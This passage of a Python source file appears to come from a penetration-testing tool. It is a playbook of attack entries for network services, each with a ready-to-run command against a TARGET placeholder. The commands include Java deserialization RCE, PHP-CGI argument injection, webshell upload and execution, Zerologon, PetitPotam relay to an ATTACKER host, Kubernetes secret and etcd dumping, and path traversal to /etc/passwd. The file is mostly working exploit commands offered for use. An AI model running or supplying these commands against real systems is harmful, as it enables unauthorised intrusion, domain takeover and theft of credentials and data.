        "ports": [80, 443],
        "attack_name": "HTTP request smuggling (CL.TE / TE.CL)",
        "description": (
            "Disagreement between frontend (CDN/LB) and backend servers on request boundaries "
            "allows poisoning the backend connection, bypassing access controls, or hijacking sessions."
        ),
        "preconditions": ["Load balancer or reverse proxy in front of application"],
        "tools": ["smuggler.py", "burpsuite HTTP Request Smuggler extension", "h2csmuggler"],
        "quick_command": "python3 smuggler.py -u http://TARGET/ --log-level info",
        "cve_refs": [],
        "mitre_technique": "T1190",
        "severity": "HIGH",
        "expected_evidence": "Desync confirmed; subsequent requests return other users' data or bypass access controls",
        "false_positive_notes": "Complex to exploit; requires precise timing; lab in safe environment first",
    },

    # =========================================================
    # Java RMI  (port 1099)
    # =========================================================
    {
        "id": "java_rmi_deserialization",
        "service": "java-rmi",
        "ports": [1099, 1098],
        "attack_name": "Java RMI deserialization RCE",
        "description": (
            "Java RMI registry on port 1099 often accepts deserialized payloads. "
            "Sending a ysoserial gadget chain to the registry or activator achieves unauthenticated RCE."
        ),
        "preconditions": ["Port 1099 open", "Java RMI registry running"],
        "tools": ["ysoserial", "rmg (remote-method-guesser)", "nmap --script rmi-dumpregistry"],
        "quick_command": "java -jar rmg.jar TARGET 1099 enum && java -jar ysoserial.jar CommonsCollections6 'id' > payload.ser && java -jar rmg.jar TARGET 1099 serial payload.ser",
        "cve_refs": [],
        "mitre_technique": "T1059.007",
        "severity": "CRITICAL",
        "expected_evidence": "OS command output via deserialization; OOB DNS callback received",
        "false_positive_notes": "JDK 8u121+ restricts RMI dynamic class loading; use gadget chains instead",
    },

    # =========================================================
    # JBoss  (port 8080)
    # =========================================================
    {
        "id": "jboss_admin_console",
        "service": "http",
        "ports": [8080, 8443, 9990],
        "attack_name": "JBoss / WildFly unauthenticated admin console",
        "description": (
            "JBoss 4.x exposed the JMX console and web console without authentication. "
            "These allow WAR deployment and direct JMX MBean invocation for OS command execution."
        ),
        "preconditions": ["JBoss / WildFly port open", "/jmx-console or /admin-console accessible"],
        "tools": ["curl", "msf exploit/multi/http/jboss_invoke_deploy"],
        "quick_command": "curl -s http://TARGET:8080/jmx-console/ | grep -i 'jboss' && curl -s http://TARGET:8080/web-console/",
        "cve_refs": ["CVE-2007-1036", "CVE-2010-0738"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "JMX console accessible; WAR deployed; OS command execution via MainDeployer",
        "false_positive_notes": "Secured in JBoss 5+; check for /jmx-console and /web-console paths",
    },

    # =========================================================
    # Hadoop NameNode  (port 50070 / 9870)
    # =========================================================
    {
        "id": "hadoop_namenode_unauth",
        "service": "http",
        "ports": [50070, 9870],
        "attack_name": "Hadoop NameNode unauthenticated web UI",
        "description": (
            "The Hadoop NameNode web UI (50070/9870) is typically unauthenticated and exposes "
            "the entire HDFS filesystem browser, allowing read/write access to all data files."
        ),
        "preconditions": ["Port 50070 or 9870 open"],
        "tools": ["curl", "hdfs CLI", "browser"],
        "quick_command": "curl -s http://TARGET:50070/webhdfs/v1/?op=LISTSTATUS | python3 -m json.tool",
        "cve_refs": [],
        "mitre_technique": "T1005",
        "severity": "CRITICAL",
        "expected_evidence": "HDFS directory listing returned; sensitive data files readable via WebHDFS REST API",
        "false_positive_notes": "Kerberos auth may be configured in enterprise Hadoop; check for 401 responses",
    },
    {
        "id": "hadoop_yarn_rce",
        "service": "http",
        "ports": [8088, 8090],
        "attack_name": "Hadoop YARN ResourceManager unauthenticated RCE",
        "description": (
            "The YARN ResourceManager REST API (port 8088) allows submitting arbitrary applications. "
            "An attacker can submit a shell command as a map-reduce job to achieve OS RCE."
        ),
        "preconditions": ["Port 8088 open", "YARN ResourceManager accessible"],
        "tools": ["curl", "yarn-exploit scripts"],
        "quick_command": "curl -s http://TARGET:8088/ws/v1/cluster/info && curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application",
        "cve_refs": [],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "New YARN application created; OS command executed on cluster node",
        "false_positive_notes": "YARN may require Kerberos in production; verify unauthenticated access first",
    },

    # =========================================================
    # Zookeeper  (port 2181)
    # =========================================================
    {
        "id": "zookeeper_no_auth",
        "service": "zookeeper",
        "ports": [2181],
        "attack_name": "Zookeeper unauthenticated access — cluster data exposure",
        "description": (
            "Zookeeper has no authentication by default. It stores Kafka broker configs, "
            "Hadoop cluster state, HBase metadata, and sometimes credentials in plaintext znodes."
        ),
        "preconditions": ["Port 2181 open"],
        "tools": ["zkCli.sh", "nmap --script zookeeper-info"],
        "quick_command": "echo 'ls /' | nc TARGET 2181 && echo 'get /brokers/ids/0' | nc TARGET 2181",
        "cve_refs": [],
        "mitre_technique": "T1005",
        "severity": "HIGH",
        "expected_evidence": "Znode tree readable; Kafka broker info, credentials, or cluster topology exposed",
        "false_positive_notes": "SASL auth can be configured but rarely is in default deployments",
    },

    # =========================================================
    # More Kubernetes attack vectors
    # =========================================================
    {
        "id": "kubernetes_kubelet_api",
        "service": "https",
        "ports": [10250, 10255],
        "attack_name": "Kubernetes kubelet read-only / exec API unauthenticated access",
        "description": (
            "The kubelet API (10250) allows pod exec and log retrieval. "
            "The read-only port (10255) exposes pod metadata, environment variables, and secrets."
        ),
        "preconditions": ["Port 10250 or 10255 open", "Kubelet anonymous auth enabled"],
        "tools": ["curl", "kubectl", "kubeletctl"],
        "quick_command": "curl -sk https://TARGET:10250/pods | python3 -m json.tool | grep -i 'env\\|secret' && kubeletctl run 'id' --server TARGET",
        "cve_refs": [],
        "mitre_technique": "T1613",
        "severity": "CRITICAL",
        "expected_evidence": "Pod list and environment variables returned; exec command output via kubelet",
        "false_positive_notes": "kubelet --anonymous-auth=false disables unauthenticated access; check version",
    },
    {
        "id": "kubernetes_secrets_dump",
        "service": "https",
        "ports": [6443],
        "attack_name": "Kubernetes secrets enumeration via API",
        "description": (
            "With any authenticated API access (service account token), listing secrets in all "
            "namespaces yields database passwords, API keys, TLS certs, and cloud provider credentials."
        ),
        "preconditions": ["Any valid Kubernetes service account token or kubeconfig"],
        "tools": ["kubectl", "curl"],
        "quick_command": "kubectl --server=https://TARGET:6443 --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get secrets --all-namespaces -o json",
        "cve_refs": [],
        "mitre_technique": "T1552.007",
        "severity": "CRITICAL",
        "expected_evidence": "Secrets decoded from base64 contain database passwords, API tokens, or TLS keys",
        "false_positive_notes": "RBAC may limit secret access; enumerate with --as=system:anonymous first",
    },

    # =========================================================
    # OpenSSH version-specific CVEs
    # =========================================================
    {
        "id": "openssh_regresshion_cve_2024_6387",
        "service": "ssh",
        "ports": [22],
        "attack_name": "OpenSSH regreSSHion race condition RCE (CVE-2024-6387)",
        "description": (
            "A signal handler race condition in OpenSSH 8.5p1–9.7p1 (and 9.2p1–9.7p1 "
            "on glibc-based systems) allows unauthenticated remote code execution as root. "
            "Exploitation requires many connection attempts and a race win."
        ),
        "preconditions": ["OpenSSH 8.5p1–9.7p1 on glibc Linux", "Port 22 open"],
        "tools": ["PoC exploit scripts (github.com/zgzhang/cve-2024-6387-poc)", "shodan"],
        "quick_command": "python3 cve-2024-6387.py TARGET 22",
        "cve_refs": ["CVE-2024-6387"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "Root shell obtained after successful race condition win",
        "false_positive_notes": "Unreliable exploit; may take hours; patched in OpenSSH 9.8p1",
    },
    {
        "id": "ssh_tunneling_pivot",
        "service": "ssh",
        "ports": [22],
        "attack_name": "SSH tunneling for internal network pivoting",
        "description": (
            "With valid SSH credentials, dynamic SOCKS5 proxy (-D) or remote port forwarding (-R) "
            "enables pivoting into internal network segments not directly reachable."
        ),
        "preconditions": ["Valid SSH credentials", "Port 22 open", "AllowTcpForwarding enabled"],
        "tools": ["ssh", "proxychains", "chisel"],
        "quick_command": "ssh -D 1080 -N user@TARGET & proxychains nmap -sT -Pn 192.168.1.0/24",
        "cve_refs": [],
        "mitre_technique": "T1572",
        "severity": "HIGH",
        "expected_evidence": "SOCKS5 proxy established; internal hosts reachable via proxychains",
        "false_positive_notes": "AllowTcpForwarding no in sshd_config blocks this; verify first",
    },

    # =========================================================
    # Zerologon / PetitPotam (SMB / RPC)
    # =========================================================
    {
        "id": "smb_zerologon",
        "service": "microsoft-ds",
        "ports": [445, 135],
        "attack_name": "Zerologon — Netlogon privilege escalation (CVE-2020-1472)",
        "description": (
            "A cryptographic flaw in MS-NRPC allows an unauthenticated attacker to set "
            "a domain controller's machine account password to empty, achieving full domain compromise."
        ),
        "preconditions": ["Port 445 open", "Unpatched Windows DC (Aug 2020 patch missing)"],
        "tools": ["impacket zerologon_tester.py", "SecuraBV/CVE-2020-1472"],
        "quick_command": "python3 zerologon_tester.py DC_NETBIOS_NAME TARGET && python3 cve-2020-1472-exploit.py DC_NETBIOS_NAME TARGET",
        "cve_refs": ["CVE-2020-1472"],
        "mitre_technique": "T1210",
        "severity": "CRITICAL",
        "expected_evidence": "Machine account password set to empty; secretsdump returns domain hashes",
        "false_positive_notes": "Destructive: sets DC machine password to null — run restorer immediately after; lab only",
    },
    {
        "id": "smb_petitpotam",
        "service": "microsoft-ds",
        "ports": [445, 135],
        "attack_name": "PetitPotam — unauthenticated NTLM coercion (CVE-2021-36942)",
        "description": (
            "PetitPotam abuses the MS-EFSRPC protocol to coerce a Windows machine into "
            "authenticating to an attacker-controlled server, enabling NTLM relay to ADCS for domain takeover."
        ),
        "preconditions": ["Port 445 open", "ADCS web enrollment or LDAP signing not enforced"],
        "tools": ["PetitPotam.py", "impacket ntlmrelayx.py"],
        "quick_command": "python3 ntlmrelayx.py -t http://ADCS/certsrv/certfnsh.asp -smb2support --adcs && python3 PetitPotam.py ATTACKER TARGET",
        "cve_refs": ["CVE-2021-36942"],
        "mitre_technique": "T1557.001",
        "severity": "CRITICAL",
        "expected_evidence": "Certificate obtained for DC computer account; pass-the-certificate attack grants domain admin",
        "false_positive_notes": "Requires ADCS in environment; MS patch blocks unauthenticated coercion on EFSRPC",
    },

    # =========================================================
    # Nginx-specific vulnerabilities
    # =========================================================
    {
        "id": "nginx_alias_traversal",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "Nginx off-by-slash alias path traversal",
        "description": (
            "When an nginx alias directive omits the trailing slash (location /files { alias /data/; }), "
            "adding '../' to the URL traverses outside the intended directory."
        ),
        "preconditions": ["Nginx with misconfigured alias directive"],
        "tools": ["curl", "nginx-alias-traversal scanner"],
        "quick_command": "curl -s http://TARGET/files../etc/passwd",
        "cve_refs": [],
        "mitre_technique": "T1005",
        "severity": "HIGH",
        "expected_evidence": "/etc/passwd or config files returned via traversal",
        "false_positive_notes": "Only affects misconfigured alias directives; verify with NGINX Beautifier",
    },
    {
        "id": "nginx_merge_slashes_bypass",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "Nginx merge_slashes bypass for access control",
        "description": (
            "Nginx by default merges consecutive slashes (//path → /path). "
            "When proxying to an application that doesn't merge slashes, double slashes bypass "
            "nginx location-based access controls (e.g. /admin → 403 but //admin → 200)."
        ),
        "preconditions": ["Nginx reverse proxy with location-based ACL", "Upstream app handles // differently"],
        "tools": ["curl", "burpsuite"],
        "quick_command": "curl -s http://TARGET//admin/ && curl -s http://TARGET//api//internal/",
        "cve_refs": [],
        "mitre_technique": "T1190",
        "severity": "MEDIUM",
        "expected_evidence": "Restricted endpoint accessible via double-slash URL variant",
        "false_positive_notes": "Set merge_slashes off in nginx to test upstream app behaviour",
    },

    # =========================================================
    # PHP-specific vulnerabilities
    # =========================================================
    {
        "id": "php_cgi_rce_cve_2012_1823",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "PHP CGI argument injection RCE (CVE-2012-1823)",
        "description": (
            "When PHP is configured as a CGI handler, the query string is passed as arguments to the PHP interpreter. "
            "The -d flag can inject php.ini options (allow_url_include, auto_prepend_file) enabling RCE."
        ),
        "preconditions": ["PHP < 5.3.12 / 5.4.2 as CGI", "Direct /cgi-bin/php or /index.php CGI access"],
        "tools": ["curl", "msf exploit/multi/http/php_cgi_arg_injection"],
        "quick_command": "curl -s 'http://TARGET/index.php?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input' --data '<?php system(\"id\"); ?>'",
        "cve_refs": ["CVE-2012-1823", "CVE-2012-2311"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "OS command output (uid=...) returned in response",
        "false_positive_notes": "Only affects PHP as CGI; PHP-FPM and mod_php are not affected",
    },
    {
        "id": "php_file_upload_bypass",
        "service": "http",
        "ports": [80, 443, 8080],
        "attack_name": "PHP file upload restriction bypass / webshell upload",
        "description": (
            "Weak file upload validation (MIME type only, client-side extension check, "
            "or double extension) allows uploading PHP webshells for RCE."
        ),
        "preconditions": ["File upload functionality", "Upload directory executable by web server"],
        "tools": ["burpsuite", "weevely", "msfvenom"],
        "quick_command": "curl -s -X POST http://TARGET/upload -F 'file=@shell.php;type=image/jpeg' && curl -s http://TARGET/uploads/shell.php?cmd=id",
        "cve_refs": [],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "Webshell accessible at upload path; OS command output returned",
        "false_positive_notes": "Many frameworks store uploads outside webroot; check if uploaded files are served",
    },

    # =========================================================
    # Kubernetes API  (port 6443)
    # =========================================================
    {
        "id": "kubernetes_anonymous_api",
        "service": "https",
        "ports": [6443],
        "attack_name": "Kubernetes API server anonymous access",
        "description": (
            "If anonymous authentication is enabled on the Kubernetes API server, "
            "unauthenticated requests can list pods, secrets, and service accounts."
        ),
        "preconditions": ["Port 6443 open", "Anonymous auth not disabled"],
        "tools": ["kubectl", "curl", "kube-hunter"],
        "quick_command": "curl -sk https://TARGET:6443/api/v1/namespaces/default/pods",
        "cve_refs": [],
        "mitre_technique": "T1078",
        "severity": "CRITICAL",
        "expected_evidence": "Pod or namespace list returned without Bearer token",
        "false_positive_notes": "Anonymous access is often scoped; check what the system:anonymous role can reach",
    },
    {
        "id": "kubernetes_etcd_no_auth",
        "service": "etcd",
        "ports": [2379, 2380],
        "attack_name": "Kubernetes etcd unauthenticated access",
        "description": (
            "etcd stores all Kubernetes cluster state including Secrets in base64 encoding. "
            "Unauthenticated access exposes service account tokens, TLS certs, and all workload config."
        ),
        "preconditions": ["Port 2379 open", "No client certificate required"],
        "tools": ["etcdctl", "curl"],
        "quick_command": "etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only | head -50",
        "cve_refs": [],
        "mitre_technique": "T1552.001",
        "severity": "CRITICAL",
        "expected_evidence": "Kubernetes Secrets and service account tokens readable in plaintext (base64)",
        "false_positive_notes": "etcd should never be exposed externally; this is a critical misconfiguration",
    },
]


def get_entries_for_service(service_name: str, port: int) -> list[dict]:
    """Return playbook entries matching a discovered service name or port."""
    service_lower = (service_name or "").lower()
    results = []
    for entry in PLAYBOOK:
        if service_lower and service_lower in entry["service"].lower():
            results.append(entry)
        elif port in entry.get("ports", []):
            results.append(entry)
    # Deduplicate by id
    seen = set()
    deduped = []
    for e in results:
        if e["id"] not in seen:
            seen.add(e["id"])
            deduped.append(e)
    return deduped


def get_all_entries() -> list[dict]:
    return PLAYBOOK
